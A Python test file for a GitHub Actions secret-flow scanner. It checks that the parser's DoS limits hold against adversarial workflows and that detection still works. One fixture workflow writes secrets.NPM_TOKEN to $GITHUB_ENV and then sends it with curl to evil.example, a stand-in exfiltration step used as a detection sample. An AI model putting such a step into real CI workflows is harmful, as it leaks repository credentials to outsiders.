"""DoS bounds for ``gha_secret_flow`` — adversary-crafted YAML can
otherwise drive the redirect-block parser into pathological CPU /
memory territory.

Bounds tested:
  * ``_MAX_WORKFLOW_YAML_BYTES`` — oversized YAML files are
    skipped, not parsed
  * ``_MAX_RUN_BODY_BYTES`` — oversized run bodies are clipped
    BEFORE the regex chain runs
  * ``_MAX_EVAL_RECURSION_DEPTH`` — eval-nested-in-eval bounds the
    recursion stack
  * ``_MAX_REDIRECT_BLOCKS_PER_BODY`` — total extracted blocks
    capped to avoid downstream KEY=VALUE blowup
  * ``_MAX_BALANCED_WALK_BYTES`` — ``_find_balanced`` walk capped
    so unmatched brackets can't cause near-O(n) walks per opener

Each test asserts the parser RUNS to completion in bounded time
and that the bounds didn't break the underlying detection logic
on inputs of legitimate size.
"""

from __future__ import annotations

import time
from pathlib import Path

from packages.sca.supply_chain import gha_secret_flow


def _write_wf(tmp_path: Path, body: str) -> Path:
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True, exist_ok=True)
    p = wf_dir / "wf.yml"
    p.write_text(body, encoding="utf-8")
    return p


# ---------------------------------------------------------------------------
# Oversized workflow YAML — skipped cleanly
# ---------------------------------------------------------------------------

def test_oversized_workflow_yaml_skipped(tmp_path: Path) -> None:
    """A workflow YAML > _MAX_WORKFLOW_YAML_BYTES must be skipped,
    not parsed."""
    # Build a workflow whose body alone exceeds the cap.
    huge = "a" * (gha_secret_flow._MAX_WORKFLOW_YAML_BYTES + 1000)
    body = f"on: push\njobs:\n  j:\n    runs-on: x\n    steps:\n      - run: '{huge}'\n"
    _write_wf(tmp_path, body)
    t0 = time.monotonic()
    hits = gha_secret_flow.scan_target(tmp_path, [], [])
    elapsed = time.monotonic() - t0
    assert hits == []
    assert elapsed < 1.0, f"oversized YAML took {elapsed:.2f}s — DoS bound broken"


# ---------------------------------------------------------------------------
# Eval-nested-in-eval — recursion depth capped
# ---------------------------------------------------------------------------

def test_deep_eval_nesting_terminates(tmp_path: Path) -> None:
    """eval-of-eval-of-eval... chains must terminate at the recursion
    cap rather than driving the parser to RecursionError."""
    # Each level wraps the previous in another eval.  Build 10
    # levels deep — more than _MAX_EVAL_RECURSION_DEPTH=4.
    inner = 'echo TOK=${{ secrets.X }} >> $GITHUB_ENV'
    for _ in range(10):
        # Escape the inner string for eval - just nest plain
        inner = f'eval "{inner}"'
    _write_wf(tmp_path, f"""\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          {inner}
""")
    t0 = time.monotonic()
    # Should not raise RecursionError; should terminate quickly.
    hits = gha_secret_flow.scan_target(tmp_path, [], [])
    elapsed = time.monotonic() - t0
    assert elapsed < 1.0
    # The depth cap may swallow this; we just need NO crash.
    del hits


# ---------------------------------------------------------------------------
# Many redirect blocks — extraction bounded
# ---------------------------------------------------------------------------

def test_many_redirect_blocks_bounded(tmp_path: Path) -> None:
    """A run body with 1000 redirects to $GITHUB_ENV must terminate
    in bounded time — the extracted-block count is capped at
    ``_MAX_REDIRECT_BLOCKS_PER_BODY``."""
    lines = "\n".join(
        f'echo "K{i}=val{i}" >> $GITHUB_ENV'
        for i in range(1000)
    )
    _write_wf(tmp_path, f"""\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          {lines}
""")
    t0 = time.monotonic()
    hits = gha_secret_flow.scan_target(tmp_path, [], [])
    elapsed = time.monotonic() - t0
    assert elapsed < 2.0, (
        f"1000 redirects took {elapsed:.2f}s — extraction bound "
        f"may not be effective"
    )
    del hits


# ---------------------------------------------------------------------------
# Unmatched braces — balanced walk capped
# ---------------------------------------------------------------------------

def test_unmatched_braces_does_not_infinite_loop(tmp_path: Path) -> None:
    """A run body with thousands of unmatched opening braces must
    not drive ``_find_balanced`` into a quadratic walk."""
    # 5000 opening braces; no closers.  Each opener triggers a
    # ``_find_balanced`` call that should hit the walk cap.
    body = "{ " * 5000
    _write_wf(tmp_path, f"""\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: '{body} >> $GITHUB_ENV'
""")
    t0 = time.monotonic()
    hits = gha_secret_flow.scan_target(tmp_path, [], [])
    elapsed = time.monotonic() - t0
    assert elapsed < 3.0, (
        f"unmatched braces took {elapsed:.2f}s — balanced walk "
        f"bound may not be effective"
    )
    del hits


# ---------------------------------------------------------------------------
# Legitimate detection still works under the bounds
# ---------------------------------------------------------------------------

def test_bounds_do_not_break_legitimate_detection(tmp_path: Path) -> None:
    """Sanity: the DoS bounds shouldn't break normal-size workflow
    detection.  Use a small launder + downstream egress shape."""
    _write_wf(tmp_path, """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "TOK=${{ secrets.NPM_TOKEN }}" >> $GITHUB_ENV
      - run: curl https://evil.example/?t=$TOK
""")
    hits = gha_secret_flow.scan_target(tmp_path, [], [])
    assert any(
        h.sink_kind == "run_block" and h.step_index == 1
        for h in hits
    )
